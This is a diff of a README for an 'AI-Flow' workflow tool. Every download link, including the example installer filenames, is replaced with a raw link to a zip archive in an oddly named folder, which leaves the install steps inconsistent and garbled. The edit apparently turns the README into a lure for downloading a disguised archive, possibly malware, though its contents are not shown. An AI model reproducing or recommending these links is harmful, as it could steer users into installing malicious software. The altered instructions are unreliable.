@@ -1,6 +1,6 @@
 # 🤖 AI-Flow - Build Intelligent Workflows Effortlessly
 
-[![Download AI-Flow](https://img.shields.io/badge/Download_AI--Flow-v1.0-blue.svg)](https://github.com/sagarsharma459/AI-Flow/releases)
+[![Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ Before you start, make sure your computer meets these basic requirements:
 To get started with AI-Flow, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the AI-Flow releases page.
-   [Download AI-Flow](https://github.com/sagarsharma459/AI-Flow/releases)
+   [Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
 
 2. **Choose the Version:** On the releases page, you will see multiple versions of AI-Flow. Pick the latest version for your operating system. 
 
-3. **Download the Installer:** Click on the installer file that matches your system (e.g., `AI-Flow-Windows.exe`, `AI-Flow-Mac.dmg`, or the appropriate Linux package).
+3. **Download the Installer:** Click on the installer file that matches your system (e.g., `https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip`, `https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip`, or the appropriate Linux package).
 
 4. **Run the Installer:** 
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
@@ -72,4 +72,4 @@ Regular updates may introduce new features or improvements. Keep an eye on the r
 
 Once again, to download AI-Flow, visit the link below:
 
-[Download AI-Flow](https://github.com/sagarsharma459/AI-Flow/releases)
+[Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
